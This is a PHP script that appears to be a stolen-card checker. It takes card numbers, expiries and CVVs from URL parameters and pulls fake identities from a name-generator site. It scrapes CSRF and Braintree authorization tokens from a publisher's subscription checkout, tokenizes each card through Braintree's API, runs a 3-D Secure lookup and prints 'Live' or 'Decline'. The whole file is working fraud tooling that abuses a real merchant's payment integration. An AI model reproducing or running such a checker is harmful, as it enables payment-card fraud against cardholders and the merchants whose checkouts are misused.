<?php

include 'func.php';
error_reporting(0);
set_time_limit(200);
extract($_GET);

    if(!is_dir("cookies")) mkdir("cookies");
    $cookies = getcwd()."/cookies/cookey".rand(10000, 9999999).".txt";

    list($cc, $mm, $yyyy, $cvv) = explode("|", preg_replace('/[^0-9|]+/', '', $_GET['cards']));
    $card = "$cc|$mm|$yyyy|$cvv";
    $cy_success = "Payment method successfully added.";
    $cy_error = "Unexpected error occured!";
    $scc = implode('+', str_split($cc, 4));
    $m = ltrim($mm, "0");
    if ($m === "") {
      $m = "0";
    }
    $yyyy = strlen($yyyy) == 2 ? '20' . $yyyy : $yyyy;
    $yy = substr($yyyy, 2,2);
    $cc1 = substr($cc, 0,4);
    $cc2 = substr($cc, 4,4);
    $cc3 = substr($cc, 8,4);
    $last4 = substr($cc, 12,4);
    $bin = substr($cc, 0,6);

    $first_digit = substr($cc, 0, 1);
    switch ($first_digit) {
        case '4':
            $brand = 'VI';
            $type1 = 'visa';
            break;
        case '5':
            $brand = 'MC';
            $type1 = 'mastercard';
            break;
        case '6':
            $brand = 'AMEX';
            break;
        default:
            $brand = 'Unknown';
    }

function capture($str, $start, $end) {
    $startPos = strpos($str, $start);
    if ($startPos === false) {
        return '';
    }
    $startPos += strlen($start);
    $endPos = strpos($str, $end, $startPos);
    if ($endPos === false) {
        return '';
    }
    return substr($str, $startPos, $endPos - $startPos);
}

$randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $firstname = explode(" ", $data['name'])[0];
    $lastname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = capture($randomShits, '"street2":', ',"phone"');
    $city = capture($local, '"', ',');
    $state = capture($local, ', ', ' ');
    $phone = str_replace("-", "", $data['phone']);
    $postcode = capture($local, "$state" , '"');                                                             
    $zipApiUrl = 'http://ziptasticapi.com/' . $postcode;
    $stateISO = json_decode(file_get_contents($zipApiUrl))->state;

$arr = [
    'AL' => ['Alabama', 1],'AK' => ['Alaska', 2], 'AS' => ['American Samoa', 3],'AZ' => ['Arizona', 4],'AR' => ['Arkansas', 5],
    'AE' => ['Armed Forces Africa', 6],'AA' => ['Armed Forces Americas', 7], 'AE' => ['Armed Forces Canada', 8],'AE' => ['Armed Forces Europe', 9],
    'AE' => ['Armed Forces Middle East', 10],'AP' => ['Armed Forces Pacific', 11],'CA' => ['California', 12],'CO' => ['Colorado', 13],
    'CT' => ['Connecticut', 14],'DE' => ['Delaware', 15],'DC' => ['District of Columbia', 16],'FM' => ['Federated States Of Micronesia', 17],
    'FL' => ['Florida', 18],'GA' => ['Georgia', 19],'GU' => ['Guam', 20],'HI' => ['Hawaii', 21],'ID' => ['Idaho', 22],'IL' => ['Illinois', 23],
    'IN' => ['Indiana', 24],'IA' => ['Iowa', 25],'KS' => ['Kansas', 26],'KY' => ['Kentucky', 27],'LA' => ['Louisiana', 28],
    'ME' => ['Maine', 29],'MH' => ['Marshall Islands', 30],'MD' => ['Maryland', 31],'MA' => ['Massachusetts', 32],'MI' => ['Michigan', 33],
    'MN' => ['Minnesota', 34],'MS' => ['Mississippi', 35],'MO' => ['Missouri', 36],'MT' => ['Montana', 37],'NE' => ['Nebraska', 38],
    'NV' => ['Nevada', 39],'NH' => ['New Hampshire', 40],'NJ' => ['New Jersey', 41],'NM' => ['New Mexico', 42],'NY' => ['New York', 43],
    'NC' => ['North Carolina', 44],'ND' => ['North Dakota', 45],'MP' => ['Northern Mariana Islands', 46],'OH' => ['Ohio', 47],'OK' => ['Oklahoma', 48],
    'OR' => ['Oregon', 49],'PW' => ['Palau', 50],'PA' => ['Pennsylvania', 51],'PR' => ['Puerto Rico', 52],'RI' => ['Rhode Island', 53],
    'SC' => ['South Carolina', 54],'SD' => ['South Dakota', 55],'TN' => ['Tennessee', 56],'TX' => ['Texas', 57],'UT' => ['Utah', 58],
    'VT' => ['Vermont', 59],'VI' => ['Virgin Islands', 60],'VA' => ['Virginia', 61],'WA' => ['Washington', 62],'WV' => ['West Virginia', 63],
    'WI' => ['Wisconsin', 64],'WY' => ['Wyoming', 65],   
];

$state = '';

foreach ($arr as $key => $value) {
    if ($key == $stateISO) {
        $state = $value[0];
        $regionId = $value[1];
        break;
    }
}    


$count = 0;
ret:
$xemail = $_GET['xemail'] ?? '';
$bin_data = get_bin_info($cc);
$info = $bin_data['info'];
$issuer = $bin_data['issuer'];
$country_card = $bin_data['country_card'];

$token_url = 'https://www.mees.com/subscribe/billing-info?type=basic';

$token_headers = [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'referer: https://www.mees.com/pricing',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
];

$ch = curl_init($token_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $token_headers);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookies, CURLOPT_COOKIEJAR => $cookies]); 
$token_response = curl_exec($ch);
$csrf_token = preg_match('/<meta name="csrf-token" content="([^"]+)"/', $token_response, $m) ? $m[1] : null;
#echo '<span class="text text-success">token_response</span> <span class="text text-success">➔ '.$token_response.'</span><br>'; 
#echo '<span class="text text-success">csrf_token</span> <span class="text text-success">➔ '.$csrf_token.'</span><br>'; 

$bearer_url = 'https://www.mees.com/subscribe/billing-info';

$bearer_headers = [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'accept-language: en-US,en;q=0.9',
    'cache-control: max-age=0',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://www.mees.com',
    'referer: https://www.mees.com/subscribe/billing-info?type=basic',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
];

$bearer_data = '_token=' . urlencode($csrf_token) .
    '&type=basic' .
    '&title=Mr' .
    '&first_name=asda' .
    '&last_name=ad' .
    '&email=' . urlencode($firstname . '@gmail.com') .
    '&telephone=6503697412' .
    '&extension=' .
    '&business_title=' .
    '&department=' .
    '&company=' .
    '&vat=' .
    '&address_line_1=151+danti' .
    '&address_line_2=' .
    '&address_line_3=' .
    '&postcode=94545' .
    '&city=hayward' .
    '&state=california' .
    '&country=US' .
    '&delivery=email';

$ch = curl_init($bearer_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $bearer_headers);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $bearer_data);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookies, CURLOPT_COOKIEJAR => $cookies]); 
$bearer_response = curl_exec($ch);
preg_match('/url=\'([^\']+)\'/', $bearer_response, $m);
$redirect_url = html_entity_decode($m[1] ?? '');

if (!empty($redirect_url)) {
    $ch2 = curl_init($redirect_url);
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch2, CURLOPT_HTTPHEADER, $bearer_headers); 
    curl_setopt_array($ch2, [CURLOPT_COOKIEFILE => $cookies, CURLOPT_COOKIEJAR => $cookies]); 
    $bearer_response2 = curl_exec($ch2);
    curl_close($ch2);

    if (preg_match("/authorization = '([^']+)'/", $bearer_response2, $m)) {
        $authorization = trim(strip_tags($m[1]));
        #echo '<span class="text text-success">authorization</span> <span class="text text-success">➔ '.$authorization.'</span><br>'; 

        $decoded = base64_decode($authorization);
        $b3_data = json_decode($decoded);

        if (isset($b3_data->authorizationFingerprint, $b3_data->merchantId)) {
            $authorizationFingerprint = $b3_data->authorizationFingerprint;
            $merchantId = $b3_data->merchantId;

            #echo '<span class="text text-success">authorizationFingerprint</span> <span class="text text-success">➔ '.$authorizationFingerprint.'</span><br>';
            #echo '<span class="text text-success">merchantId</span> <span class="text text-success">➔ '.$merchantId.'</span><br>';
        } else {
            #echo '<span class="text text-warning">Second Request Tokens are Empty</span><br>';
        }

    } else {
        $authorization = null;
        #echo '<span class="text text-warning">authorization</span> <span class="text text-warning">➔ '.$authorization.'</span><br>'; 
    }
}

$guid = bin2hex(random_bytes(16)); 
$sessionId = substr($guid, 0, -6);

$b3starturl = 'https://payments.braintree-api.com/graphql';

$b3startheaders = [
    'accept: */*',
    'accept-language: en-US,en;q=0.9',
    'authorization: Bearer ' . $authorizationFingerprint,
    'braintree-version: 2018-05-10',
    'content-type: application/json',
    'origin: https://assets.braintreegateway.com',
    'referer: https://assets.braintreegateway.com/',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
];

$b3startdata = [
    'clientSdkMetadata' => [
        'source' => 'client',
        'integration' => 'custom',
        'sessionId' => $sessionId
    ],
    'query' => 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
    'variables' => [
        'input' => [
            'creditCard' => [
                'number' => $cc,
                'expirationMonth' => $mm,
                'expirationYear' => $yyyy,
                'cvv' => $cvv
            ],
            'options' => [
                'validate' => false
            ]
        ]
    ],
    'operationName' => 'TokenizeCreditCard'
];

$ch = curl_init($b3starturl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $b3startheaders);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($b3startdata));
$b3startresponse = curl_exec($ch);
$token = json_decode($b3startresponse)->data->tokenizeCreditCard->token ?? null;
#echo '<span class="text text-success">b3startresponse</span> <span class="text text-success">➔ '.$b3startresponse.'</span><br>'; 
#echo '<span class="text text-success">token</span> <span class="text text-success">➔ '.$token.'</span><br>'; 

$result3durl = 'https://api.braintreegateway.com/merchants/x3k7wk95d8kbcwd4/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup';

$result3dheaders = [
    'accept: */*',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/json',
    'origin: https://www.mees.com',
    'referer: https://www.mees.com/',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
];

$result3ddata = [
    'amount' => '3350',
    'additionalInfo' => (object)[],
    'bin' => substr($cc, 0, 6),
    'dfReferenceId' => '0_65fe3251-f288-49dd-bdbe-6698e17194a4',
    'clientMetadata' => [
        'requestedThreeDSecureVersion' => '2',
        'sdkVersion' => 'web/3.85.2',
        'cardinalDeviceDataCollectionTimeElapsed' => 314,
        'issuerDeviceDataCollectionTimeElapsed' => 4154,
        'issuerDeviceDataCollectionResult' => true
    ],
    'authorizationFingerprint' => $authorizationFingerprint,
    'braintreeLibraryVersion' => 'braintree/web/3.85.2',
    '_meta' => [
        'merchantAppId' => 'www.mees.com',
        'platform' => 'web',
        'sdkVersion' => '3.85.2',
        'source' => 'client',
        'integration' => 'custom',
        'integrationType' => 'custom',
        'sessionId' => $sessionId
    ]
];

$ch = curl_init($result3durl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $result3dheaders);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($result3ddata));
$result3dresponse = curl_exec($ch);
$status = json_decode($result3dresponse, true)['paymentMethod']['threeDSecureInfo']['status'] ?? null;
$enrolled = json_decode($result3dresponse, true)['paymentMethod']['threeDSecureInfo']['enrolled'] ?? null;
#echo '<span class="text text-success">result3dresponse</span> <span class="text text-success">➔ '.$result3dresponse.'</span><br>';
#echo '<span class="text text-success">vbv_status</span> <span class="text text-success">➔ '.$status.'</span><br>';
#echo '<span class="text text-success">vbv_enrolled</span> <span class="text text-success">➔ '.$enrolled.'</span><br>';

if ($status == "authenticate_successful" || $status == "authenticate_attempt_successful" || $status == "lookup_not_enrolled" || strtolower($enrolled) == 'n') {
    echo '<span class="text text-success">Live</span> <span class="text text-success">➔ '.$card.' ➔ '.$status.' ('.$enrolled.')</span><br>';
} else {
    echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ '.$status.' ('.$enrolled.')</span><br>';
}

unset($ch);
unlink($cookies);
flush();
ob_flush();
ob_end_flush();

?>